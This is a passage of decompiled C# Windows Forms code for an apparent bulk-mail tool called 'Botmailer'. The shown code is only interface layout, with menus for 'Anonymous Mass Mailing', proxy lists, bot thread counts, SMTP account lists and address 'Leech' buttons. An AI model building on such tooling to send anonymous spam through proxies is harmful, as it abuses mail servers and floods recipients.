          this._MenuItem24.Click -= new EventHandler(this.MenuItem24_Click);
        this._MenuItem24 = value;
        if (this._MenuItem24 == null)
          return;
        this._MenuItem24.Click += new EventHandler(this.MenuItem24_Click);
      }
    }

    internal virtual Button Button6
    {
      get => this._Button6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button6 != null)
          this._Button6.Click -= new EventHandler(this.Button6_Click);
        this._Button6 = value;
        if (this._Button6 == null)
          return;
        this._Button6.Click += new EventHandler(this.Button6_Click);
      }
    }

    internal virtual Button Addaccnt
    {
      get => this._Addaccnt;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Addaccnt != null)
          this._Addaccnt.Click -= new EventHandler(this.Addaccnt_Click);
        this._Addaccnt = value;
        if (this._Addaccnt == null)
          return;
        this._Addaccnt.Click += new EventHandler(this.Addaccnt_Click);
      }
    }

    internal virtual Button Button16
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button16 == null)
          ;
        this._Button16 = value;
        if (this._Button16 == null)
          ;
      }
      get => this._Button16;
    }

    internal virtual MenuItem MenuItem9
    {
      get => this._MenuItem9;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem9 != null)
          this._MenuItem9.Click -= new EventHandler(this.MenuItem9_Click);
        this._MenuItem9 = value;
        if (this._MenuItem9 == null)
          return;
        this._MenuItem9.Click += new EventHandler(this.MenuItem9_Click);
      }
    }

    internal virtual Button CheckAll
    {
      get => this._CheckAll;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._CheckAll == null)
          ;
        this._CheckAll = value;
        if (this._CheckAll == null)
          ;
      }
    }

    internal virtual CheckBox Stopchecking
    {
      get => this._Stopchecking;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Stopchecking == null)
          ;
        this._Stopchecking = value;
        if (this._Stopchecking == null)
          ;
      }
    }

    internal virtual ListBox ListBox2
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ListBox2 == null)
          ;
        this._ListBox2 = value;
        if (this._ListBox2 == null)
          ;
      }
      get => this._ListBox2;
    }

    internal virtual Button Button8
    {
      get => this._Button8;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button8 != null)
          this._Button8.Click -= new EventHandler(this.Button8_Click);
        this._Button8 = value;
        if (this._Button8 == null)
          return;
        this._Button8.Click += new EventHandler(this.Button8_Click);
      }
    }

    internal virtual Button Button9
    {
      get => this._Button9;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button9 != null)
          this._Button9.Click -= new EventHandler(this.Button9_Click);
        this._Button9 = value;
        if (this._Button9 == null)
          return;
        this._Button9.Click += new EventHandler(this.Button9_Click);
      }
    }

    internal virtual LinkLabel LinkLabel1
    {
      get => this._LinkLabel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._LinkLabel1 == null)
          ;
        this._LinkLabel1 = value;
        if (this._LinkLabel1 == null)
          ;
      }
    }

    internal virtual MenuItem MenuItem11
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem11 == null)
          ;
        this._MenuItem11 = value;
        if (this._MenuItem11 == null)
          ;
      }
      get => this._MenuItem11;
    }

    internal virtual Label Label21
    {
      get => this._Label21;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label21 == null)
          ;
        this._Label21 = value;
        if (this._Label21 == null)
          ;
      }
    }

    internal virtual Button Button10
    {
      get => this._Button10;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button10 != null)
          this._Button10.Click -= new EventHandler(this.Button10_Click);
        this._Button10 = value;
        if (this._Button10 == null)
          return;
        this._Button10.Click += new EventHandler(this.Button10_Click);
      }
    }

    internal virtual TextBox textbox1111
    {
      get => this._textbox1111;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._textbox1111 == null)
          ;
        this._textbox1111 = value;
        if (this._textbox1111 == null)
          ;
      }
    }

    internal virtual TrackBar TrackBar2
    {
      get => this._TrackBar2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._TrackBar2 == null)
          ;
        this._TrackBar2 = value;
        if (this._TrackBar2 == null)
          ;
      }
    }

    internal virtual Label Label17
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label17 == null)
          ;
        this._Label17 = value;
        if (this._Label17 == null)
          ;
      }
      get => this._Label17;
    }

    internal virtual CheckBox HTML
    {
      get => this._HTML;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._HTML == null)
          ;
        this._HTML = value;
        if (this._HTML == null)
          ;
      }
    }

    internal virtual Panel Panel3
    {
      get => this._Panel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Panel3 == null)
          ;
        this._Panel3 = value;
        if (this._Panel3 == null)
          ;
      }
    }

    internal virtual ListBox Listlog
    {
      get => this._Listlog;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Listlog == null)
          ;
        this._Listlog = value;
        if (this._Listlog == null)
          ;
      }
    }

    internal virtual Button Button5
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button5 != null)
          this._Button5.Click -= new EventHandler(this.Button5_Click_2);
        this._Button5 = value;
        if (this._Button5 == null)
          return;
        this._Button5.Click += new EventHandler(this.Button5_Click_2);
      }
      get => this._Button5;
    }

    internal virtual Button Button12
    {
      get => this._Button12;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button12 != null)
          this._Button12.Click -= new EventHandler(this.Button12_Click);
        this._Button12 = value;
        if (this._Button12 == null)
          return;
        this._Button12.Click += new EventHandler(this.Button12_Click);
      }
    }

    internal virtual Label Label13
    {
      get => this._Label13;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label13 == null)
          ;
        this._Label13 = value;
        if (this._Label13 == null)
          ;
      }
    }

    internal virtual Label Label14
    {
      get => this._Label14;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label14 == null)
          ;
        this._Label14 = value;
        if (this._Label14 == null)
          ;
      }
    }

    internal virtual Panel Message
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Message == null)
          ;
        this._Message = value;
        if (this._Message == null)
          ;
      }
      get => this._Message;
    }

    internal virtual Button Button13
    {
      get => this._Button13;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button13 != null)
          this._Button13.Click -= new EventHandler(this.Button13_Click);
        this._Button13 = value;
        if (this._Button13 == null)
          return;
        this._Button13.Click += new EventHandler(this.Button13_Click);
      }
    }

    internal virtual Panel Panel4
    {
      get => this._Panel4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Panel4 == null)
          ;
        this._Panel4 = value;
        if (this._Panel4 == null)
          ;
      }
    }

    internal virtual Label Label15
    {
      get => this._Label15;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label15 == null)
          ;
        this._Label15 = value;
        if (this._Label15 == null)
          ;
      }
    }

    internal virtual Button Button15
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button15 == null)
          ;
        this._Button15 = value;
        if (this._Button15 == null)
          ;
      }
      get => this._Button15;
    }

    internal virtual Button Button14
    {
      get => this._Button14;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button14 != null)
          this._Button14.Click -= new EventHandler(this.Button14_Click);
        this._Button14 = value;
        if (this._Button14 == null)
          return;
        this._Button14.Click += new EventHandler(this.Button14_Click);
      }
    }

    public Form1()
    {
      this.Closed += new EventHandler(this.Form1_closed);
      this.Load += new EventHandler(this.Form1_Load);
      this.ASCII = Encoding.ASCII;
      this.P = 0;
      this.qou = 0;
      this.ppou = 0;
      this.InitializeComponent();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ResourceManager resourceManager = new ResourceManager(typeof (Form1));
      this.MainMenu1 = new MainMenu();
      this.MenuItem1 = new MenuItem();
      this.Send = new MenuItem();
      this.MenuItem6 = new MenuItem();
      this.MenuItem11 = new MenuItem();
      this.MenuItem7 = new MenuItem();
      this.MenuItem19 = new MenuItem();
      this.MenuItem20 = new MenuItem();
      this.MenuItem23 = new MenuItem();
      this.MenuItem18 = new MenuItem();
      this.MenuItem21 = new MenuItem();
      this.MenuItem22 = new MenuItem();
      this.MenuItem24 = new MenuItem();
      this.List = new MenuItem();
      this.MenuItem9 = new MenuItem();
      this.Uselistbox = new MenuItem();
      this.MenuItem4 = new MenuItem();
      this.MenuItem16 = new MenuItem();
      this.Panel1 = new Panel();
      this.Button10 = new Button();
      this.Label21 = new Label();
      this.textbox1111 = new TextBox();
      this.LinkLabel1 = new LinkLabel();
      this.CloseAbout = new Button();
      this.OpenFileDialog1 = new OpenFileDialog();
      this.Panel2 = new Panel();
      this.Button13 = new Button();
      this.Panel4 = new Panel();
      this.Button19 = new Button();
      this.Button18 = new Button();
      this.Button17 = new Button();
      this.Button16 = new Button();
      this.ListBox2 = new ListBox();
      this.Button15 = new Button();
      this.Button14 = new Button();
      this.Label15 = new Label();
      this.leechbox = new TextBox();
      this.Button8 = new Button();
      this.CheckAll = new Button();
      this.Save = new Button();
      this.Delete = new Button();
      this.HideProxy = new Button();
      this.OpenProxy = new Button();
      this.ProxyGroup = new GroupBox();
      this.Button20 = new Button();
      this.ProxySMTP = new TextBox();
      this.Label12 = new Label();
      this.Label11 = new Label();
      this.Threads = new Label();
      this.TrackBar1 = new TrackBar();
      this.Proxylist2 = new ListBox();
      this.Button7 = new Button();
      this.Proxylist = new ListBox();
      this.CheckProxy = new Button();
      this.Button11 = new Button();
      this.Proxy = new TextBox();
      this.Message = new Panel();
      this.Label17 = new Label();
      this.Button5 = new Button();
      this.HTML = new CheckBox();
      this.Button6 = new Button();
      this.Subject = new TextBox();
      this.Label5 = new Label();
      this.Label4 = new Label();
      this.Label3 = new Label();
      this.Fromname = new TextBox();
      this.Label2 = new Label();
      this.Label1 = new Label();
      this.Body = new RichTextBox();
      this.ToName = new TextBox();
      this.ReplyTo = new TextBox();
      this.From = new TextBox();
      this.Recipient = new TextBox();
      this.TrackBar2 = new TrackBar();
      this.SmtpAuth = new Panel();
      this.Label16 = new Label();
      this.Button21 = new Button();
      this.Button9 = new Button();
      this.Addaccnt = new Button();
      this.SaveAccount = new Button();
      this.clear = new Button();
      this.OpenSmtp = new Button();
      this.HideSMTP = new Button();
      this.Label10 = new Label();
      this.Label9 = new Label();
      this.Label8 = new Label();
      this.Label7 = new Label();
      this.Label6 = new Label();
      this.RealEmail = new TextBox();
      this.Accountlist = new ListBox();
      this.password = new TextBox();
      this.username = new TextBox();
      this.pop3 = new TextBox();
      this.smtp = new TextBox();
      this.SaveFileDialog1 = new SaveFileDialog();
      this.MailingList = new Panel();
      this.Stopchecking = new CheckBox();
      this.Button4 = new Button();
      this.Button3 = new Button();
      this.Button2 = new Button();
      this.ListBox1 = new ListBox();
      this.Button1 = new Button();
      this.Panel3 = new Panel();
      this.Button12 = new Button();
      this.Listlog = new ListBox();
      this.log = new LinkLabel();
      this.Label13 = new Label();
      this.Label14 = new Label();
      this.Status = new Label();
      this.Panel1.SuspendLayout();
      this.Panel2.SuspendLayout();
      this.Panel4.SuspendLayout();
      this.ProxyGroup.SuspendLayout();
      this.TrackBar1.BeginInit();
      this.Message.SuspendLayout();
      this.TrackBar2.BeginInit();
      this.SmtpAuth.SuspendLayout();
      this.MailingList.SuspendLayout();
      this.Panel3.SuspendLayout();
      this.SuspendLayout();
      this.MainMenu1.MenuItems.AddRange(new MenuItem[3]
      {
        this.MenuItem1,
        this.List,
        this.MenuItem4
      });
      this.MenuItem1.DefaultItem = true;
      this.MenuItem1.Index = 0;
      this.MenuItem1.MenuItems.AddRange(new MenuItem[8]
      {
        this.Send,
        this.MenuItem6,
        this.MenuItem11,
        this.MenuItem7,
        this.MenuItem18,
        this.MenuItem21,
        this.MenuItem22,
        this.MenuItem24
      });
      this.MenuItem1.Text = "Main";
      this.Send.Index = 0;
      this.Send.Text = "Start";
      this.MenuItem6.Index = 1;
      this.MenuItem6.Text = "Stop";
      this.MenuItem11.Index = 2;
      this.MenuItem11.Text = "-";
      this.MenuItem7.Index = 3;
      this.MenuItem7.MenuItems.AddRange(new MenuItem[3]
      {
        this.MenuItem19,
        this.MenuItem20,
        this.MenuItem23
      });
      this.MenuItem7.Text = "Mode";
      this.MenuItem7.Visible = false;
      this.MenuItem19.Index = 0;
      this.MenuItem19.Text = "Legit Mailing List";
      this.MenuItem20.Index = 1;
      this.MenuItem20.Text = "Bulk Mailing List";
      this.MenuItem23.Index = 2;
      this.MenuItem23.Text = "Anonymous Mass Mailing";
      this.MenuItem18.Index = 4;
      this.MenuItem18.Text = "Mail Message";
      this.MenuItem21.Index = 5;
      this.MenuItem21.Text = "Proxy List";
      this.MenuItem21.Visible = false;
      this.MenuItem22.Index = 6;
      this.MenuItem22.Text = "SMTP Auth";
      this.MenuItem24.Index = 7;
      this.MenuItem24.Text = "List";
      this.MenuItem24.Visible = false;
      this.List.Index = 1;
      this.List.MenuItems.AddRange(new MenuItem[2]
      {
        this.MenuItem9,
        this.Uselistbox
      });
      this.List.Text = "List";
      this.MenuItem9.Index = 0;
      this.MenuItem9.Text = "Validate List";
      this.MenuItem9.Visible = false;
      this.Uselistbox.Index = 1;
      this.Uselistbox.Text = "Use List";
      this.MenuItem4.Index = 2;
      this.MenuItem4.MenuItems.AddRange(new MenuItem[1]
      {
        this.MenuItem16
      });
      this.MenuItem4.Text = "About";
      this.MenuItem16.Index = 0;
      this.MenuItem16.Text = "Version";
      this.Panel1.BackgroundImage = (Image) resourceManager.GetObject("Panel1.BackgroundImage");
      this.Panel1.BorderStyle = BorderStyle.FixedSingle;
      this.Panel1.Controls.AddRange(new Control[5]
      {
        (Control) this.Button10,
        (Control) this.Label21,
        (Control) this.textbox1111,
        (Control) this.LinkLabel1,
        (Control) this.CloseAbout
      });
      Panel panel1_1 = this.Panel1;
      Point point1 = new Point(136, 8);
      Point point2 = point1;
      panel1_1.Location = point2;
      this.Panel1.Name = "Panel1";
      Panel panel1_2 = this.Panel1;
      Size size1 = new Size(264, 176);
      Size size2 = size1;
      panel1_2.Size = size2;
      this.Panel1.TabIndex = 0;
      this.Panel1.Visible = false;
      this.Button10.FlatStyle = FlatStyle.Flat;
      Button button10_1 = this.Button10;
      point1 = new Point(176, 120);
      Point point3 = point1;
      button10_1.Location = point3;
      this.Button10.Name = "Button10";
      Button button10_2 = this.Button10;
      size1 = new Size(64, 24);
      Size size3 = size1;
      button10_2.Size = size3;
      this.Button10.TabIndex = 4;
      this.Button10.Text = "ok";
      this.Label21.BackColor = SystemColors.ControlLightLight;
      this.Label21.BorderStyle = BorderStyle.FixedSingle;
      Label label21_1 = this.Label21;
      point1 = new Point(152, 48);
      Point point4 = point1;
      label21_1.Location = point4;
      this.Label21.Name = "Label21";
      Label label21_2 = this.Label21;
      size1 = new Size(96, 40);
      Size size4 = size1;
      label21_2.Size = size4;
      this.Label21.TabIndex = 3;
      this.Label21.Text = "Enter Registeration Code";
      this.textbox1111.BorderStyle = BorderStyle.FixedSingle;
      TextBox textbox1111 = this.textbox1111;
      point1 = new Point(152, 96);
      Point point5 = point1;
      textbox1111.Location = point5;
      this.textbox1111.Name = "textbox1111";
      this.textbox1111.TabIndex = 2;
      this.textbox1111.Text = "";
      this.LinkLabel1.BackColor = System.Drawing.Color.White;
      LinkLabel linkLabel1_1 = this.LinkLabel1;
      point1 = new Point(104, 24);
      Point point6 = point1;
      linkLabel1_1.Location = point6;
      this.LinkLabel1.Name = "LinkLabel1";
      LinkLabel linkLabel1_2 = this.LinkLabel1;
      size1 = new Size(144, 16);
      Size size5 = size1;
      linkLabel1_2.Size = size5;
      this.LinkLabel1.TabIndex = 1;
      ((Label) this.LinkLabel1).TabStop = true;
      this.LinkLabel1.Text = "http://Botmailer.Beware.us";
      this.CloseAbout.BackColor = System.Drawing.Color.White;
      this.CloseAbout.FlatStyle = FlatStyle.Popup;
      this.CloseAbout.ForeColor = SystemColors.ControlText;
      Button closeAbout1 = this.CloseAbout;
      point1 = new Point(8, 64);
      Point point7 = point1;
      closeAbout1.Location = point7;
      this.CloseAbout.Name = "CloseAbout";
      Button closeAbout2 = this.CloseAbout;
      size1 = new Size(80, 24);
      Size size6 = size1;
      closeAbout2.Size = size6;
      this.CloseAbout.TabIndex = 0;
      this.CloseAbout.Text = "Hide";
      this.Panel2.BackColor = System.Drawing.Color.Transparent;
      this.Panel2.BorderStyle = BorderStyle.FixedSingle;
      this.Panel2.Controls.AddRange(new Control[9]
      {
        (Control) this.Button13,
        (Control) this.Panel4,
        (Control) this.Button8,
        (Control) this.CheckAll,
        (Control) this.Save,
        (Control) this.Delete,
        (Control) this.HideProxy,
        (Control) this.OpenProxy,
        (Control) this.ProxyGroup
      });
      Panel panel2_1 = this.Panel2;
      point1 = new Point(0, 8);
      Point point8 = point1;
      panel2_1.Location = point8;
      this.Panel2.Name = "Panel2";
      Panel panel2_2 = this.Panel2;
      size1 = new Size(416, 256);
      Size size7 = size1;
      panel2_2.Size = size7;
      this.Panel2.TabIndex = 1;
      this.Panel2.Visible = false;
      this.Button13.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button13.FlatStyle = FlatStyle.Popup;
      Button button13_1 = this.Button13;
      point1 = new Point(333, 7);
      Point point9 = point1;
      button13_1.Location = point9;
      this.Button13.Name = "Button13";
      Button button13_2 = this.Button13;
      size1 = new Size(69, 24);
      Size size8 = size1;
      button13_2.Size = size8;
      this.Button13.TabIndex = 18;
      this.Button13.Text = "Leech";
      this.Button13.Visible = false;
      this.Panel4.BorderStyle = BorderStyle.FixedSingle;
      this.Panel4.Controls.AddRange(new Control[9]
      {
        (Control) this.Button19,
        (Control) this.Button18,
        (Control) this.Button17,
        (Control) this.Button16,
        (Control) this.ListBox2,
        (Control) this.Button15,
        (Control) this.Button14,
        (Control) this.Label15,
        (Control) this.leechbox
      });
      Panel panel4_1 = this.Panel4;
      point1 = new Point(313, 5);
      Point point10 = point1;
      panel4_1.Location = point10;
      this.Panel4.Name = "Panel4";
      Panel panel4_2 = this.Panel4;
      size1 = new Size(98, 43);
      Size size9 = size1;
      panel4_2.Size = size9;
      this.Panel4.TabIndex = 19;
      this.Panel4.Visible = false;
      this.Button19.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button19.FlatStyle = FlatStyle.Popup;
      Button button19_1 = this.Button19;
      point1 = new Point(247, 157);
      Point point11 = point1;
      button19_1.Location = point11;
      this.Button19.Name = "Button19";
      Button button19_2 = this.Button19;
      size1 = new Size(68, 22);
      Size size10 = size1;
      button19_2.Size = size10;
      this.Button19.TabIndex = 10;
      this.Button19.Text = "Save";
      this.Button18.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button18.FlatStyle = FlatStyle.Popup;
      Button button18_1 = this.Button18;
      point1 = new Point(246, 125);
      Point point12 = point1;
      button18_1.Location = point12;
      this.Button18.Name = "Button18";
      Button button18_2 = this.Button18;
      size1 = new Size(68, 22);
      Size size11 = size1;
      button18_2.Size = size11;
      this.Button18.TabIndex = 9;
      this.Button18.Text = "Open";
      this.Button17.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button17.FlatStyle = FlatStyle.Popup;
      Button button17_1 = this.Button17;
      point1 = new Point(245, 66);
      Point point13 = point1;
      button17_1.Location = point13;
      this.Button17.Name = "Button17";
      Button button17_2 = this.Button17;
      size1 = new Size(68, 22);
      Size size12 = size1;
      button17_2.Size = size12;
      this.Button17.TabIndex = 8;
      this.Button17.Text = "Leech All";
      this.Button16.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button16.FlatStyle = FlatStyle.Popup;
      Button button16_1 = this.Button16;
      point1 = new Point(244, 11);
      Point point14 = point1;
      button16_1.Location = point14;
      this.Button16.Name = "Button16";
      Button button16_2 = this.Button16;
      size1 = new Size(72, 20);
      Size size13 = size1;
      button16_2.Size = size13;
      this.Button16.TabIndex = 7;
      this.Button16.Text = "Leech";
      ListBox listBox2_1 = this.ListBox2;
      point1 = new Point(9, 42);
      Point point15 = point1;
      listBox2_1.Location = point15;
      this.ListBox2.Name = "ListBox2";
      ListBox listBox2_2 = this.ListBox2;
      size1 = new Size(216, 134);
      Size size14 = size1;
      listBox2_2.Size = size14;
      this.ListBox2.TabIndex = 6;
      this.Button15.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button15.FlatStyle = FlatStyle.Popup;
      Button button15_1 = this.Button15;
      point1 = new Point(245, 37);
      Point point16 = point1;
      button15_1.Location = point16;
      this.Button15.Name = "Button15";
      Button button15_2 = this.Button15;
      size1 = new Size(70, 20);
      Size size15 = size1;
      button15_2.Size = size15;
      this.Button15.TabIndex = 5;
      this.Button15.Text = "Add";
      this.Button14.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button14.FlatStyle = FlatStyle.Popup;
      Button button14_1 = this.Button14;
      point1 = new Point(246, 97);
      Point point17 = point1;
      button14_1.Location = point17;
      this.Button14.Name = "Button14";
      Button button14_2 = this.Button14;
      size1 = new Size(68, 19);
      Size size16 = size1;
      button14_2.Size = size16;
      this.Button14.TabIndex = 4;
      this.Button14.Text = "hide";
      Label label15_1 = this.Label15;
      point1 = new Point(5, 9);
      Point point18 = point1;
      label15_1.Location = point18;
      this.Label15.Name = "Label15";
      Label label15_2 = this.Label15;
      size1 = new Size(34, 19);
      Size size17 = size1;
      label15_2.Size = size17;
      this.Label15.TabIndex = 2;
      this.Label15.Text = "From:";
      this.leechbox.BorderStyle = BorderStyle.FixedSingle;
      TextBox leechbox1 = this.leechbox;
      point1 = new Point(52, 8);
      Point point19 = point1;
      leechbox1.Location = point19;
      this.leechbox.Name = "leechbox";
      TextBox leechbox2 = this.leechbox;
      size1 = new Size(178, 20);
      Size size18 = size1;
      leechbox2.Size = size18;
      this.leechbox.TabIndex = 0;
      this.leechbox.Text = "";
      this.Button8.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button8.FlatStyle = FlatStyle.Popup;
      Button button8_1 = this.Button8;
      point1 = new Point(333, 38);
      Point point20 = point1;
      button8_1.Location = point20;
      this.Button8.Name = "Button8";
      Button button8_2 = this.Button8;
      size1 = new Size(69, 24);
      Size size19 = size1;
      button8_2.Size = size19;
      this.Button8.TabIndex = 17;
      this.Button8.Text = "Clear";
      this.CheckAll.BackColor = System.Drawing.Color.CornflowerBlue;
      this.CheckAll.FlatStyle = FlatStyle.Popup;
      Button checkAll1 = this.CheckAll;
      point1 = new Point(333, 73);
      Point point21 = point1;
      checkAll1.Location = point21;
      this.CheckAll.Name = "CheckAll";
      Button checkAll2 = this.CheckAll;
      size1 = new Size(69, 24);
      Size size20 = size1;
      checkAll2.Size = size20;
      this.CheckAll.TabIndex = 16;
      this.CheckAll.Text = "Check All";
      this.Save.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Save.FlatStyle = FlatStyle.Popup;
      Button save1 = this.Save;
      point1 = new Point(333, 107);
      Point point22 = point1;
      save1.Location = point22;
      this.Save.Name = "Save";
      Button save2 = this.Save;
      size1 = new Size(68, 25);
      Size size21 = size1;
      save2.Size = size21;
      this.Save.TabIndex = 15;
      this.Save.Text = "Save";
      this.Delete.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Delete.FlatStyle = FlatStyle.Popup;
      Button delete1 = this.Delete;
      point1 = new Point(333, 141);
      Point point23 = point1;
      delete1.Location = point23;
      this.Delete.Name = "Delete";
      Button delete2 = this.Delete;
      size1 = new Size(70, 24);
      Size size22 = size1;
      delete2.Size = size22;
      this.Delete.TabIndex = 14;
      this.Delete.Text = "Delete";
      this.HideProxy.BackColor = System.Drawing.Color.CornflowerBlue;
      this.HideProxy.FlatStyle = FlatStyle.Popup;
      Button hideProxy1 = this.HideProxy;
      point1 = new Point(334, 210);
      Point point24 = point1;
      hideProxy1.Location = point24;
      this.HideProxy.Name = "HideProxy";
      Button hideProxy2 = this.HideProxy;
      size1 = new Size(69, 27);
      Size size23 = size1;
      hideProxy2.Size = size23;
      this.HideProxy.TabIndex = 1;
      this.HideProxy.Text = "Hide";
      this.OpenProxy.BackColor = System.Drawing.Color.CornflowerBlue;
      this.OpenProxy.FlatStyle = FlatStyle.Popup;
      Button openProxy1 = this.OpenProxy;
      point1 = new Point(333, 174);
      Point point25 = point1;
      openProxy1.Location = point25;
      this.OpenProxy.Name = "OpenProxy";
      Button openProxy2 = this.OpenProxy;
      size1 = new Size(70, 24);
      Size size24 = size1;
      openProxy2.Size = size24;
      this.OpenProxy.TabIndex = 13;
      this.OpenProxy.Text = "Open";
      this.ProxyGroup.BackColor = System.Drawing.Color.Transparent;
      this.ProxyGroup.Controls.AddRange(new Control[11]
      {
        (Control) this.Button20,
        (Control) this.ProxySMTP,
        (Control) this.Label12,
        (Control) this.Label11,
        (Control) this.Threads,
        (Control) this.TrackBar1,
        (Control) this.Proxylist2,
        (Control) this.Button7,
        (Control) this.Proxylist,
        (Control) this.CheckProxy,
        (Control) this.Button11
      });
      this.ProxyGroup.ForeColor = SystemColors.ControlText;
      GroupBox proxyGroup1 = this.ProxyGroup;
      point1 = new Point(14, 16);
      Point point26 = point1;
      proxyGroup1.Location = point26;
      this.ProxyGroup.Name = "ProxyGroup";
      GroupBox proxyGroup2 = this.ProxyGroup;
      size1 = new Size(311, 229);
      Size size25 = size1;
      proxyGroup2.Size = size25;
      this.ProxyGroup.TabIndex = 2;
      this.ProxyGroup.TabStop = false;
      this.ProxyGroup.Text = "Proxy List";
      this.Button20.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button20.FlatStyle = FlatStyle.Popup;
      Button button20_1 = this.Button20;
      point1 = new Point(142, 15);
      Point point27 = point1;
      button20_1.Location = point27;
      this.Button20.Name = "Button20";
      Button button20_2 = this.Button20;
      size1 = new Size(161, 22);
      Size size26 = size1;
      button20_2.Size = size26;
      this.Button20.TabIndex = 17;
      this.Button20.Text = "Find/Check Proxy SMTP/Add";
      this.Button20.Visible = false;
      TextBox proxySmtp1 = this.ProxySMTP;
      point1 = new Point(6, 18);
      Point point28 = point1;
      proxySmtp1.Location = point28;
      this.ProxySMTP.Name = "ProxySMTP";
      TextBox proxySmtp2 = this.ProxySMTP;
      size1 = new Size(121, 20);
      Size size27 = size1;
      proxySmtp2.Size = size27;
      this.ProxySMTP.TabIndex = 16;
      this.ProxySMTP.Text = "";
      this.ProxySMTP.Visible = false;
      this.Label12.BackColor = System.Drawing.Color.Transparent;
      Label label12_1 = this.Label12;
      point1 = new Point(17, 70);
      Point point29 = point1;
      label12_1.Location = point29;
      this.Label12.Name = "Label12";
      Label label12_2 = this.Label12;
      size1 = new Size(118, 16);
      Size size28 = size1;
      label12_2.Size = size28;
      this.Label12.TabIndex = 15;
      this.Label12.Text = "Checked Proxies";
      this.Label11.BackColor = System.Drawing.Color.Transparent;
      Label label11_1 = this.Label11;
      point1 = new Point(158, 71);
      Point point30 = point1;
      label11_1.Location = point30;
      this.Label11.Name = "Label11";
      Label label11_2 = this.Label11;
      size1 = new Size(115, 16);
      Size size29 = size1;
      label11_2.Size = size29;
      this.Label11.TabIndex = 14;
      this.Label11.Text = "Unchecked Proxies";
      this.Threads.BackColor = System.Drawing.Color.Transparent;
      Label threads1 = this.Threads;
      point1 = new Point(154, 201);
      Point point31 = point1;
      threads1.Location = point31;
      this.Threads.Name = "Threads";
      Label threads2 = this.Threads;
      size1 = new Size(113, 17);
      Size size30 = size1;
      threads2.Size = size30;
      this.Threads.TabIndex = 7;
      this.Threads.Text = "# of Bots 1 - 30";
      this.TrackBar1.BackColor = System.Drawing.Color.LightSteelBlue;
      TrackBar trackBar1_1 = this.TrackBar1;
      point1 = new Point(144, 179);
      Point point32 = point1;
      trackBar1_1.Location = point32;
      this.TrackBar1.Maximum = 30;
      this.TrackBar1.Minimum = 1;
      this.TrackBar1.Name = "TrackBar1";
      TrackBar trackBar1_2 = this.TrackBar1;
      size1 = new Size(136, 45);
      Size size31 = size1;
      trackBar1_2.Size = size31;
      this.TrackBar1.TabIndex = 6;
      this.TrackBar1.Value = 1;
      this.Proxylist2.BorderStyle = BorderStyle.FixedSingle;
      ListBox proxylist2_1 = this.Proxylist2;
      point1 = new Point(6, 90);
      Point point33 = point1;
      proxylist2_1.Location = point33;
      this.Proxylist2.Name = "Proxylist2";
      ListBox proxylist2_2 = this.Proxylist2;
      size1 = new Size(124, 80);
      Size size32 = size1;
      proxylist2_2.Size = size32;
      this.Proxylist2.TabIndex = 5;
      this.Button7.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button7.FlatStyle = FlatStyle.Popup;
      Button button7_1 = this.Button7;
      point1 = new Point(245, 42);
      Point point34 = point1;
      button7_1.Location = point34;
      this.Button7.Name = "Button7";
      Button button7_2 = this.Button7;
      size1 = new Size(53, 22);
      Size size33 = size1;
      button7_2.Size = size33;
      this.Button7.TabIndex = 4;
      this.Button7.Text = "Add";
      this.Proxylist.BorderStyle = BorderStyle.FixedSingle;
      ListBox proxylist1 = this.Proxylist;
      point1 = new Point(149, 89);
      Point point35 = point1;
      proxylist1.Location = point35;
      this.Proxylist.Name = "Proxylist";
      ListBox proxylist2 = this.Proxylist;
      size1 = new Size(120, 80);
      Size size34 = size1;
      proxylist2.Size = size34;
      this.Proxylist.TabIndex = 0;
      this.CheckProxy.BackColor = System.Drawing.Color.CornflowerBlue;
      this.CheckProxy.FlatStyle = FlatStyle.Popup;
